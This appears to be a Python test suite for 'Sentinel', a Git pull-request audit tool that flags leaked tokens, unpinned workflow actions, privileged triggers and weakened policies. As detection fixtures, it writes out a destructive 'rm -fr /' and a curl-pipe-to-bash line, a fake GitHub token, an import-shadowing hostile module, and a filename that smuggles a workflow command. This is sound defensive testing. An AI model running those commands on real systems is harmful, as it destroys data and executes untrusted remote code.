from __future__ import annotations

import argparse
import contextlib
import hashlib
import importlib.util
import io
import json
import os
from pathlib import Path
import re
import subprocess
import sys
import tempfile
import unittest
from unittest import mock


ROOT = Path(__file__).resolve().parents[1]
SENTINEL = ROOT / "sentinel" / "sentinel.py"
SPEC = importlib.util.spec_from_file_location("sentinel_under_test", SENTINEL)
assert SPEC is not None and SPEC.loader is not None
SENTINEL_MODULE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(SENTINEL_MODULE)


def run(*args: str, cwd: Path | None = None) -> subprocess.CompletedProcess[str]:
    return subprocess.run(args, cwd=cwd, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)


def clean_environment() -> dict[str, str]:
    return {key: value for key, value in os.environ.items() if not key.startswith("GITHUB_")}


class SentinelTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name)
        self.repo = self.root / "repo"
        self.repo.mkdir()
        self.output = self.root / "evidence"
        run("git", "init", "-b", "main", str(self.repo))
        run("git", "config", "user.email", "sentinel@example.invalid", cwd=self.repo)
        run("git", "config", "user.name", "Sentinel Test", cwd=self.repo)
        self.write("README.md", "# fixture\n")
        self.commit("base")
        self.base = self.head()
        self.audit_number = 0

    def tearDown(self) -> None:
        self.temp.cleanup()

    def write(self, relative: str, content: str | bytes) -> None:
        path = self.repo / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")

    def head(self) -> str:
        return run("git", "rev-parse", "HEAD", cwd=self.repo).stdout.strip()

    def event(self, base: str, head: str, body: str = "") -> Path:
        path = self.root / f"event-{self.audit_number}.json"
        path.write_text(json.dumps({
            "number": 7,
            "pull_request": {"base": {"sha": base}, "head": {"sha": head}, "body": body},
        }), encoding="utf-8")
        return path

    def audit(
        self,
        *extra: str,
        base: str | None = None,
        event: Path | None = None,
        include_base: bool = True,
        env: dict[str, str] | None = None,
    ) -> tuple[subprocess.CompletedProcess[str], dict | None]:
        self.audit_number += 1
        evidence = self.output / f"review-{self.audit_number}.json"
        report = self.output / f"review-{self.audit_number}.md"
        command = [
            sys.executable, str(SENTINEL), "audit", "--repo", str(self.repo),
            "--evidence", str(evidence), "--report", str(report),
        ]
        if include_base:
            command.extend(["--base", base or self.base, "--head", "HEAD"])
        if event is not None:
            command.extend(["--event-path", str(event)])
        command.extend(extra)
        proc = subprocess.run(
            command,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env or clean_environment(),
        )
        payload = json.loads(evidence.read_text(encoding="utf-8")) if evidence.exists() else None
        return proc, payload

    def commit(self, message: str) -> None:
        run("git", "add", "-A", cwd=self.repo)
        run("git", "commit", "-m", message, cwd=self.repo)

    def policy(self, **overrides: object) -> str:
        value: dict[str, object] = {
            "schema": "truenorth.sentinel.policy.v1",
            "profile": "fixture",
            "enforcement": "audit",
            "fail_on": ["critical"],
            "max_file_bytes": 5242880,
            "sensitive_globs": [],
            "required_evidence": [],
        }
        value.update(overrides)
        return json.dumps(value, sort_keys=True) + "\n"

    @staticmethod
    def codes(evidence: dict) -> set[str]:
        return {item["code"] for item in evidence["findings"]}

    def test_clean_evidence_is_non_authorizing_and_complete(self) -> None:
        self.write("src/app.py", "print('ok')\n")
        self.commit("safe")
        proc, evidence = self.audit()
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertEqual(evidence["review_status"], "NO_FINDINGS")
        self.assertEqual(evidence["completion_status"], "complete")
        self.assertEqual(evidence["authority"], "none")
        self.assertFalse(evidence["effect_authorized"])
        self.assertFalse(evidence["promotion_authorized"])
        self.assertTrue(evidence["subject"]["snapshot_stable"])
        self.assertEqual(evidence["subject"]["path_encoding"], "percent-encoded-bytes-v1")
        self.assertEqual(len(evidence["subject"]["head"]), 40)

    def test_local_repository_identity_is_explicitly_bound(self) -> None:
        proc, evidence = self.audit(
            "--repository-identity", "example/repo", "--scope", "full", include_base=False
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertEqual(evidence["subject"]["repository"], "example/repo")

    def test_repository_identity_is_rejected_for_ref_audit(self) -> None:
        proc, evidence = self.audit("--repository-identity", "example/repo")
        self.assertEqual(proc.returncode, 3)
        self.assertIsNone(evidence)
        self.assertIn("allowed only for a local working-tree audit", proc.stderr)

    def test_repository_path_must_equal_git_worktree_root(self) -> None:
        alias = self.root / "alias"
        alias.mkdir()
        run("git", "config", "core.worktree", str(self.repo), cwd=self.repo)
        (alias / ".git").write_text(f"gitdir: {self.repo / '.git'}\n", encoding="utf-8")
        evidence = self.output / "alias.json"
        report = self.output / "alias.md"
        proc = subprocess.run(
            [
                sys.executable, str(SENTINEL), "audit", "--repo", str(alias),
                "--scope", "full", "--evidence", str(evidence), "--report", str(report),
            ],
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=clean_environment(),
        )
        self.assertEqual(proc.returncode, 3)
        self.assertFalse(evidence.exists())
        self.assertIn("canonical Git working tree", proc.stderr)

    def test_v1_rejects_enforce_mode_without_evidence_claim(self) -> None:
        token = "ghp_" + "abcdefghijklmnopqrstuvwxyz1234567890"
        self.write("fixture.env", f"TOKEN={token}\n")
        self.commit("secret")
        proc, evidence = self.audit("--enforcement", "enforce")
        self.assertEqual(proc.returncode, 2)
        self.assertIsNone(evidence)
        self.assertIn("invalid choice", proc.stderr)

    def test_secret_finding_is_advisory_exit_zero(self) -> None:
        token = "ghp_" + "abcdefghijklmnopqrstuvwxyz1234567890"
        self.write("fixture.env", f"TOKEN={token}\n")
        self.commit("secret")
        proc, evidence = self.audit("--enforcement", "audit")
        self.assertEqual(proc.returncode, 0)
        assert evidence is not None
        self.assertIn("SNT003", self.codes(evidence))
        self.assertEqual(evidence["review_status"], "REVIEW_REQUIRED")

    def test_unpinned_action_is_reported_without_blocking_audit(self) -> None:
        self.write(".github/workflows/ci.yml", "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n")
        self.commit("workflow")
        proc, evidence = self.audit("--enforcement", "audit")
        self.assertEqual(proc.returncode, 0)
        assert evidence is not None
        self.assertIn("SNT010", self.codes(evidence))

    def test_json_yaml_workflow_fails_closed_to_manual_review(self) -> None:
        workflow = {
            "name": "json",
            "on": ["pull_request"],
            "jobs": {"audit": {"runs-on": "ubuntu-latest", "steps": [{"uses": "actions/checkout@v4"}]}},
        }
        self.write(".github/workflows/json.yml", json.dumps(workflow) + "\n")
        self.commit("json workflow")
        proc, evidence = self.audit()
        self.assertEqual(proc.returncode, 0)
        assert evidence is not None
        self.assertIn("SNT015", self.codes(evidence))

    def test_all_privileged_trigger_forms_require_review(self) -> None:
        for index, trigger in enumerate((
            "on: [pull_request_target]",
            'on:\n  "pull_request_target":',
            "on: pull_request_target",
            'on: "pull_request_target"',
            "on:\n  - pull_request_target",
        )):
            with self.subTest(trigger=trigger):
                self.write(
                    f".github/workflows/privileged-{index}.yml",
                    f"{trigger}\njobs:\n  inspect:\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n",
                )
                self.commit(f"privileged trigger {index}")
                proc, evidence = self.audit()
                self.assertEqual(proc.returncode, 0, proc.stderr)
                assert evidence is not None
                current_path = f".github/workflows/privileged-{index}.yml"
                self.assertTrue(any(
                    item["code"] == "SNT012" and item.get("path") == current_path
                    for item in evidence["findings"]
                ))

    def test_permission_alias_fails_closed_to_manual_review(self) -> None:
        self.write(
            ".github/workflows/alias.yml",
            "x-permission: &p write-all\npermissions: *p\njobs:\n  inspect:\n    steps: []\n",
        )
        self.commit("permission alias")
        proc, evidence = self.audit()
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertIn("SNT015", self.codes(evidence))

    def test_isolated_action_runtime_ignores_hostile_python_modules(self) -> None:
        marker = self.root / "python-import-marker"
        self.write(
            "json.py",
            f"from pathlib import Path\nPath({str(marker)!r}).write_text('executed')\nraise RuntimeError('hostile json shadow')\n",
        )
        self.commit("hostile Python module")
        evidence = self.output / "isolated.json"
        report = self.output / "isolated.md"
        env = clean_environment()
        env["PYTHONPATH"] = str(self.repo)
        proc = subprocess.run(
            [
                sys.executable, "-I", "-X", "utf8", str(SENTINEL), "audit",
                "--repo", str(self.repo), "--base", self.base, "--head", "HEAD",
                "--evidence", str(evidence), "--report", str(report),
            ],
            cwd=self.repo,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertTrue(evidence.is_file())
        self.assertFalse(marker.exists())

    def test_mutable_container_action_is_reported(self) -> None:
        self.write(".github/workflows/docker.yml", "jobs:\n  test:\n    steps:\n      - uses: docker://alpine:latest\n")
        self.commit("container action")
        proc, evidence = self.audit()
        self.assertEqual(proc.returncode, 0)
        assert evidence is not None
        self.assertIn("SNT010", self.codes(evidence))

    def test_base_policy_wins_over_weakened_head_policy(self) -> None:
        self.write(".truenorth/sentinel.json", self.policy(
            profile="effect-kernel",
            sensitive_globs=["**/*effect*"],
            required_evidence=["Authority impact", "Negative tests"],
        ))
        self.commit("policy")
        policy_base = self.head()
        self.write(".truenorth/sentinel.json", self.policy(profile="baseline"))
        self.write("src/effect_broker.py", "def propose(): return None\n")
        self.commit("weaken policy and change effect")
        event = self.event(policy_base, self.head())
        proc, evidence = self.audit("--config", ".truenorth/sentinel.json", event=event, base=policy_base)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertIn("SNT020", self.codes(evidence))
        self.assertIn("SNT022", self.codes(evidence))
        self.assertEqual(evidence["subject"]["profile"], "effect-kernel")

    def test_pull_request_target_also_uses_base_policy(self) -> None:
        self.write(".truenorth/sentinel.json", self.policy(
            profile="secure", sensitive_globs=["**/*effect*"], required_evidence=["Authority impact"]
        ))
        self.commit("secure policy")
        policy_base = self.head()
        self.write(".truenorth/sentinel.json", self.policy(profile="weakened"))
        self.write("src/effect_gate.py", "DENY = True\n")
        self.commit("weaken policy")
        event = self.event(policy_base, self.head())
        env = clean_environment()
        env.update({"GITHUB_EVENT_NAME": "pull_request_target", "GITHUB_EVENT_PATH": str(event)})
        proc, evidence = self.audit("--config", ".truenorth/sentinel.json", base=policy_base, env=env)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertEqual(evidence["subject"]["profile"], "secure")
        self.assertTrue(evidence["diagnostics"]["policy_source"].startswith(f"git:{policy_base}:"))
        self.assertIn("SNT020", self.codes(evidence))

    def test_first_policy_is_bootstrap_review_not_self_trust(self) -> None:
        original_base = self.base
        self.write(".truenorth/sentinel.json", self.policy(profile="effect-kernel"))
        self.commit("first policy")
        event = self.event(original_base, self.head())
        proc, evidence = self.audit(
            "--config", ".truenorth/sentinel.json", "--require-config",
            event=event, base=original_base,
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertEqual(evidence["subject"]["profile"], "baseline")
        self.assertIn("SNT024", self.codes(evidence))

    def test_markdown_evidence_requires_exact_nonempty_sections_and_is_sealed(self) -> None:
        self.write(".truenorth/sentinel.json", self.policy(
            sensitive_globs=["**/*effect*"], required_evidence=["Rollback", "Negative tests"]
        ))
        self.commit("policy")
        policy_base = self.head()
        self.write("src/effect_gate.py", "DENY = True\n")
        self.commit("effect change")

        spoof = "There is no rollback and no negative tests."
        event = self.event(policy_base, self.head(), spoof)
        _, missing = self.audit("--config", ".truenorth/sentinel.json", event=event, base=policy_base)
        assert missing is not None
        self.assertIn("SNT020", self.codes(missing))

        good_body = "## Rollback\nRevert this commit.\n\n## Negative tests\nDenied unsafe fixture.\n"
        event = self.event(policy_base, self.head(), good_body)
        _, complete = self.audit("--config", ".truenorth/sentinel.json", event=event, base=policy_base)
        assert complete is not None
        self.assertNotIn("SNT020", self.codes(complete))
        self.assertEqual(
            complete["subject"]["pull_request_body_digest"],
            hashlib.sha256(good_body.encode("utf-8")).hexdigest(),
        )
        self.assertNotEqual(missing["evidence_digest"], complete["evidence_digest"])

    def test_local_sensitive_change_requires_external_evidence(self) -> None:
        self.write(".truenorth/sentinel.json", self.policy(
            sensitive_globs=["**/*effect*"], required_evidence=["Authority impact"]
        ))
        self.commit("policy")
        self.write("src/effect_gate.py", "DENY = True\n")
        proc, evidence = self.audit("--config", ".truenorth/sentinel.json", include_base=False)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertIn("SNT020", self.codes(evidence))

    def test_head_git_object_wins_over_dirty_worktree_bytes(self) -> None:
        self.write("src/safe.py", "VALUE = 'safe'\n")
        self.commit("safe")
        committed_head = self.head()
        token = "ghp_" + "abcdefghijklmnopqrstuvwxyz1234567890"
        self.write("src/safe.py", f"TOKEN = '{token}'\n")
        event = self.event(self.base, committed_head)
        proc, evidence = self.audit(event=event)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertNotIn("SNT003", self.codes(evidence))
        self.assertTrue(evidence["diagnostics"]["working_tree_dirty"])
        self.assertEqual(evidence["subject"]["source_mode"], "git-object")

    def test_git_replace_objects_cannot_substitute_claimed_head(self) -> None:
        self.write("src/app.py", "VALUE = 'safe'\n")
        self.commit("safe original")
        original = self.head()
        run("git", "checkout", "-b", "replacement", self.base, cwd=self.repo)
        token = "ghp_" + "abcdefghijklmnopqrstuvwxyz1234567890"
        self.write("src/app.py", f"TOKEN = '{token}'\n")
        self.commit("malicious replacement")
        replacement = self.head()
        run("git", "checkout", "--detach", original, cwd=self.repo)
        run("git", "replace", original, replacement, cwd=self.repo)
        event = self.event(self.base, original)
        proc, evidence = self.audit(event=event)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertEqual(evidence["subject"]["head"], original)
        self.assertNotIn("SNT003", self.codes(evidence))

    def test_gitlinks_are_bound_and_require_separate_review(self) -> None:
        sub = self.root / "sub"
        sub.mkdir()
        run("git", "init", "-b", "main", str(sub))
        run("git", "config", "user.email", "sentinel@example.invalid", cwd=sub)
        run("git", "config", "user.name", "Sentinel Test", cwd=sub)
        (sub / "x").write_text("one\n", encoding="utf-8")
        run("git", "add", "x", cwd=sub)
        run("git", "commit", "-m", "one", cwd=sub)
        first_target = run("git", "rev-parse", "HEAD", cwd=sub).stdout.strip()
        run("git", "update-index", "--add", "--cacheinfo", f"160000,{first_target},vendor", cwd=self.repo)
        run("git", "commit", "-m", "gitlink one", cwd=self.repo)
        first_head = self.head()

        (sub / "x").write_text("two\n", encoding="utf-8")
        run("git", "commit", "-am", "two", cwd=sub)
        second_target = run("git", "rev-parse", "HEAD", cwd=sub).stdout.strip()
        run("git", "update-index", "--cacheinfo", f"160000,{second_target},vendor", cwd=self.repo)
        run("git", "commit", "-m", "gitlink two", cwd=self.repo)
        second_head = self.head()
        event = self.event(first_head, second_head)
        _, second = self.audit(event=event, base=first_head)
        assert second is not None

        (sub / "x").write_text("three\n", encoding="utf-8")
        run("git", "commit", "-am", "three", cwd=sub)
        third_target = run("git", "rev-parse", "HEAD", cwd=sub).stdout.strip()
        run("git", "update-index", "--cacheinfo", f"160000,{third_target},vendor", cwd=self.repo)
        run("git", "commit", "-m", "gitlink three", cwd=self.repo)
        event = self.event(second_head, self.head())
        _, third = self.audit(event=event, base=second_head)
        assert third is not None
        self.assertIn("SNT014", self.codes(second))
        self.assertIn("SNT014", self.codes(third))
        self.assertNotEqual(second["subject"]["candidate_digest"], third["subject"]["candidate_digest"])

    def test_deleted_and_renamed_sensitive_paths_stay_in_scope(self) -> None:
        self.write(".truenorth/sentinel.json", self.policy(
            sensitive_globs=["**/*effect*"], required_evidence=["Authority impact"]
        ))
        self.write("src/effect_gate.py", "DENY = True\n")
        self.commit("policy and gate")
        gate_base = self.head()
        run("git", "mv", "src/effect_gate.py", "src/gate.py", cwd=self.repo)
        self.commit("rename gate")
        event = self.event(gate_base, self.head())
        proc, evidence = self.audit("--config", ".truenorth/sentinel.json", event=event, base=gate_base)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertIn("src/effect_gate.py", evidence["subject"]["deleted_paths"])
        self.assertIn("src/effect_gate.py", evidence["subject"]["inspected_paths"])
        self.assertIn("src/gate.py", evidence["subject"]["inspected_paths"])
        self.assertIn("SNT020", self.codes(evidence))

    def test_local_snapshot_change_yields_structured_incomplete_evidence(self) -> None:
        self.write("src/race.py", "VALUE = 'safe'\n")
        evidence_path = self.output / "race.json"
        report_path = self.output / "race.md"
        args = argparse.Namespace(
            command="audit", repo=str(self.repo), config=None, require_config=False,
            enforcement=None, base=None, head=None, event_path=None, scope="changes",
            evidence=str(evidence_path), report=str(report_path),
        )
        original_scan = SENTINEL_MODULE.scan_captured_file
        changed = False

        def mutate_after_scan(entry: dict, policy: dict) -> list[dict]:
            nonlocal changed
            result = original_scan(entry, policy)
            if entry["path"] == "src/race.py" and not changed:
                changed = True
                token = "ghp_" + "abcdefghijklmnopqrstuvwxyz1234567890"
                self.write("src/race.py", f"TOKEN = '{token}'\n")
            return result

        with mock.patch.dict(os.environ, clean_environment(), clear=True), mock.patch.object(
            SENTINEL_MODULE, "scan_captured_file", side_effect=mutate_after_scan
        ), contextlib.redirect_stdout(io.StringIO()):
            return_code = SENTINEL_MODULE.audit(args)
        evidence = json.loads(evidence_path.read_text(encoding="utf-8"))
        self.assertEqual(return_code, 3)
        self.assertEqual(evidence["completion_status"], "incomplete")
        self.assertEqual(evidence["review_status"], "INCOMPLETE")
        self.assertFalse(evidence["subject"]["snapshot_stable"])
        self.assertIn("SNT090", self.codes(evidence))

    def test_binary_and_oversized_sensitive_files_remain_visible(self) -> None:
        token = "ghp_" + "abcdefghijklmnopqrstuvwxyz1234567890"
        self.write("binary.env", f"TOKEN={token}".encode() + b"\x00padding")
        self.commit("binary secret")
        event = self.event(self.base, self.head())
        _, binary = self.audit(event=event)
        assert binary is not None
        self.assertIn("SNT003", self.codes(binary))
        self.assertIn("SNT013", self.codes(binary))

        self.write(".truenorth/sentinel.json", self.policy(max_file_bytes=1024))
        self.commit("small file policy")
        policy_base = self.head()
        self.write("oversized.env", ("A" * 2048) + token)
        self.commit("oversized secret")
        event = self.event(policy_base, self.head())
        _, oversized = self.audit("--config", ".truenorth/sentinel.json", event=event, base=policy_base)
        assert oversized is not None
        self.assertIn("SNT005", self.codes(oversized))
        self.assertIn("SNT013", self.codes(oversized))

    def test_current_github_token_and_env_variant_are_detected(self) -> None:
        token = "github_pat_" + ("A1" * 45)
        self.write(".env.local", f"TOKEN={token}\n")
        self.commit("fine-grained token")
        proc, evidence = self.audit()
        self.assertEqual(proc.returncode, 0)
        assert evidence is not None
        self.assertIn("SNT003", self.codes(evidence))
        self.assertIn("SNT013", self.codes(evidence))

    def test_shell_flag_order_and_continuation_are_detected(self) -> None:
        self.write("cleanup.sh", "rm -fr /\ncurl https://example.invalid/tool \\\n+  | bash\n")
        self.commit("risky shell")
        proc, evidence = self.audit()
        self.assertEqual(proc.returncode, 0)
        assert evidence is not None
        self.assertIn("SNT004", self.codes(evidence))
        self.assertGreaterEqual(sum(1 for item in evidence["findings"] if item["code"] == "SNT004"), 2)

    def test_invalid_utf8_git_path_is_reversibly_encoded(self) -> None:
        raw_path = os.fsencode(self.repo) + b"/bad-\xff.txt"
        descriptor = os.open(raw_path, os.O_WRONLY | os.O_CREAT, 0o600)
        try:
            os.write(descriptor, b"payload\n")
        finally:
            os.close(descriptor)
        self.commit("invalid utf8 path")
        event = self.event(self.base, self.head())
        proc, evidence = self.audit(event=event)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertIn("bad-%FF.txt", evidence["subject"]["inspected_paths"])

    def test_github_output_emits_no_workflow_commands_from_filename(self) -> None:
        injected = "bad\n::warning title=spoofed::injected.env"
        self.write(injected, "safe\n")
        self.commit("newline filename")
        event = self.event(self.base, self.head())
        env = clean_environment()
        env.update({
            "GITHUB_ACTIONS": "true", "GITHUB_EVENT_NAME": "pull_request",
            "GITHUB_SHA": self.head(), "GITHUB_REPOSITORY": "fixture/repo",
        })
        proc, evidence = self.audit(event=event, env=env)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        assert evidence is not None
        self.assertFalse(any(line.startswith("::") for line in proc.stdout.splitlines()))
        self.assertIn("bad%0A%3A%3Awarning%20title%3Dspoofed%3A%3Ainjected.env", evidence["subject"]["inspected_paths"])

    def test_evidence_digest_is_stable_across_runs(self) -> None:
        self.write("src/repeatable.py", "VALUE = 1\n")
        self.commit("repeatable")
        first_proc, first = self.audit()
        second_proc, second = self.audit()
        self.assertEqual(first_proc.returncode, 0)
        self.assertEqual(second_proc.returncode, 0)
        assert first is not None and second is not None
        self.assertEqual(first["evidence_digest"], second["evidence_digest"])

    def test_runtime_rejects_every_schema_invalid_policy_shape(self) -> None:
        base_value = json.loads(self.policy())
        cases: dict[str, dict] = {}
        missing_profile = dict(base_value)
        del missing_profile["profile"]
        cases["missing-profile"] = missing_profile
        cases["duplicate-fail-on"] = {**base_value, "fail_on": ["critical", "critical"]}
        cases["short-evidence"] = {**base_value, "required_evidence": ["x"]}
        cases["boolean-size"] = {**base_value, "max_file_bytes": True}
        cases["duplicate-glob"] = {**base_value, "sensitive_globs": ["src/**", "src/**"]}
        cases["enforce"] = {**base_value, "enforcement": "enforce"}
        cases["non-string-schema-pointer"] = {**base_value, "$schema": 7}
        cases["non-string-fail-on"] = {**base_value, "fail_on": [{"severity": "critical"}]}
        for name, value in cases.items():
            with self.subTest(name=name):
                self.write(".truenorth/sentinel.json", json.dumps(value) + "\n")
                self.commit(f"invalid policy {name}")
                proc, evidence = self.audit("--config", ".truenorth/sentinel.json")
                self.assertEqual(proc.returncode, 3, proc.stderr)
                self.assertIsNone(evidence)

    def test_repository_commands_are_not_a_policy_capability(self) -> None:
        self.write(".truenorth/sentinel.json", self.policy(test_commands=["touch SHOULD_NOT_EXIST"]))
        self.commit("command-bearing policy")
        proc, evidence = self.audit("--config", ".truenorth/sentinel.json")
        self.assertEqual(proc.returncode, 3)
        self.assertIsNone(evidence)
        self.assertFalse((self.repo / "SHOULD_NOT_EXIST").exists())

    def test_schemas_are_valid_json_and_review_contract_is_strict(self) -> None:
        schemas = []
        for path in (ROOT / "sentinel" / "schemas").glob("*.json"):
            value = json.loads(path.read_text(encoding="utf-8"))
            self.assertIsInstance(value, dict)
            schemas.append(value)
        review = next(value for value in schemas if value.get("title") == "TrueNorth Federation Sentinel Review Evidence v1")
        self.assertFalse(review["additionalProperties"])
        self.assertIn("completion_status", review["required"])
        self.assertFalse(review["properties"]["summary"]["additionalProperties"])
        self.assertEqual(review["properties"]["findings"]["items"]["$ref"], "#/$defs/finding")

        local_registry = next(
            value for value in schemas
            if value.get("title") == "TrueNorth Federation Sentinel Local Repository Registry v1"
        )
        repository_id = local_registry["properties"]["repositories"]["items"]["properties"]["id"]
        pattern = re.compile(repository_id["pattern"])
        for unsafe in (".", "..", "_fleet"):
            self.assertIsNone(pattern.fullmatch(unsafe))
        self.assertIsNotNone(pattern.fullmatch("buildroom-os"))


if __name__ == "__main__":
    unittest.main()
